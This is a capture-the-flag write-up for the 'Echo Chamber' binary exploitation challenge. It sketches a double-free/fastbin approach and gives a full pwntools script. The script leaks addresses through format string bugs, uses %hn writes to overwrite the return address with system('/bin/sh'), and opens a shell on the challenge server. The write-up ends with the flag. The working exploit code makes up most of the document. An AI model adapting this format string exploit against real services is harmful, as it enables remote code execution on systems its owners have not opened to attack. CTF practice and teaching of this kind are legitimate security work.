# P.W.N. CTF

## _Echo Chamber_

## Information

**Category:** | **Points:** | **Solves** | **Writeup Author**
--- | --- | --- | ---
PWN | 552 | 8 | merrychap

**Description:** 

> Echo chambers are a thing nowadays. Flag in /opt.

`nc echochamber.uni.hctf.fun 13374 `


## TLDR Solution

[echo_chamber](./echo_chamber)

[libc.so.6](./libc.so.6)

[ld-linux.so.2](./ld-linux.so.2)


There were basically two different approaches to exploit the binary (at least, I found two of them).

1. The first one: Produce a double free attack in the echo loop using format string bug. After this, still in the echo loop, manage the `malloc` to allocate in the same chunk that was freed earlier. Quit from the echo loop and produce fastbin attack, allocating in `__free_hook`, writing `one_gadget` address there.

2. The second one: In the echo loop, use stack address chains to be able to write anywhere in the memory. Then just overwrite RET with the `system` address and RET+8 with the `/bin/sh` address in the given libc.

I decided to implement the second one exploit. The first one I found after the CTF ended.

```python
from time import sleep

from pwn import *


def main():    
    libc = ELF('./libc.so.6')
    # pc = process(['./ld-linux.so.2', './echo_chamber'], env={'LD_PRELOAD': './libc.so.6'})

    pc = remote('echochamber.uni.hctf.fun', 13374)

    raw_input()

    pc.recvline()

    pc.sendline('%1$x')
    stack = int(pc.recv(10), 16) - 40
    print 'stack @ ' + hex(stack)

    pc.sendline('%5$x')
    text_base = int(pc.recv(10), 16) - 0x2029
    print 'text_base @ ' + hex(text_base)

    # 10 is an offset for buffer
    pc.sendline('%10$x')
    heap_base = int(pc.recv(10), 16) - 0x240
    print 'heap_base @ ' + hex(heap_base)

    pc.sendline('%19$x')
    libc_base = int(pc.recv(10), 16) - 241 - libc.symbols['__libc_start_main']
    print 'libc_base @ ' + hex(libc_base)
    print 

    print '1. become ' + hex((stack + 56) & 0xffff)
    print '2. become ' + hex((stack + 98) & 0xffff)

    target1 = libc_base + libc.symbols['system']
    target2 = libc_base + list(libc.search('/bin/sh'))[0]

    pc.sendline('A' * 32)

    # 61 is the offset for the server, but
    # 62 is for the local exploitation
    pc.sendline('%{}x%25$hn'.format((stack + 56) & 0xffff))
    pc.sendline('%{}x%14$hn'.format((stack + 92) & 0xffff))
    pc.sendline('%{}x%61$hn'.format((stack + 98) & 0xffff))
    pc.sendline('%{}x%14$hn'.format((stack + 92) >> 16))
    pc.sendline('%{}x%61$hn'.format((stack + 96) & 0xffff))
    pc.sendline('%{}x%24$hn'.format((target1) & 0xffff))
    pc.sendline('%{}x%14$hn'.format((stack + 92 + 2) & 0xffff))
    pc.sendline('%{}x%24$hn'.format((target1) >> 16))

    pc.sendline('%{}x%61$hn'.format((stack + 100) & 0xffff))
    pc.sendline('%{}x%14$hn'.format(target2 & 0xffff))
    pc.sendline('%{}x%61$hn'.format((stack + 100+2) & 0xffff))
    pc.sendline('%{}x%14$hn'.format((target2 >> 16) & 0xffff))
    pc.sendline('%{}x%61$hn'.format((stack + 96) & 0xffff))

    pc.sendline('q')

    pc.sendlineafter('Was it fun?', 'A')
    pc.sendlineafter('Would you echo again?', 'A')

    pc.interactive()


if __name__ == '__main__':
    main()
```

> flag{something_with_tcache_ga48ghydgja}